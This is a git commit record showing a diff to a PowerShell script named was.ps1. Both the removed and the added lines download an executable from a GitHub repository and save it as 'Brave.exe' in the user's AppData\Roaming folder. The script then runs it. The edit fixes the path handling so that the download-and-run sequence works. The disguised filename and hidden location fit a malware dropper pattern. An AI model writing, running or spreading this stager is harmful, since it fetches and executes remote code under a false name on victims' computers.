a193dc40181b75e97809933e82180f8ef7150cc9
Dev Patel <109647822+dev-eloper-365@users.noreply.github.com>
2022-08-08 18:01:12 +0530

    Update was.ps1

--- was.ps1
+++ was.ps1
@@ -1,2 +1,4 @@
-$n=Brave.exe
-$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe","$HOME\AppData\Roaming\"+$n);Start-Process -FilePath "$HOME\AppData\Roaming\"+$n
+$p="$HOME\AppData\Roaming\Brave.exe";
+$e=New-Object System.Net.WebClient;
+$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe",$p);
+Start-Process -FilePath $p
